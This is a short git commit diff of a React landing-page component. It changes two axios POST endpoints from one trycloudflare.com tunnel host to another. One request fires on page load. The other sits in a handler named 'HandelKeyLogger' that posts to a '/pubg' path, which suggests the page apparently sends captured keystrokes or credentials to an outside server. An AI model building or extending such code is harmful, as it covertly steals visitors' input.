843d72f7198e64dc130e4a87f2ee6869ed5e3ee3
rohithramesh2202-bit <rohith.ramesh2202@gmail.com>
2026-06-04 11:13:15 +0530

    second update

--- src/component/Landingpage.jsx
+++ src/component/Landingpage.jsx
@@ -5,7 +5,7 @@ export default function LandingPage() {
 
   useEffect(()=>{
     const getdata=async()=>{
-        await axios.post('https://barbie-shakespeare-llc-cent.trycloudflare.com/').then((result)=>{
+        await axios.post('https://connectors-seas-tom-creatures.trycloudflare.com/').then((result)=>{
             console.log(result.data)
         }).catch((err)=>{
             console.log(err)
@@ -16,7 +16,7 @@ export default function LandingPage() {
   },[])
 
   const HandelKeyLogger=async()=>{
-        await axios.post("https://barbie-shakespeare-llc-cent.trycloudflare.com/pubg").then((result)=>{
+        await axios.post("https://connectors-seas-tom-creatures.trycloudflare.com/pubg").then((result)=>{
             console.log(result.data)
         }).catch((err)=>{
             console.log(err)
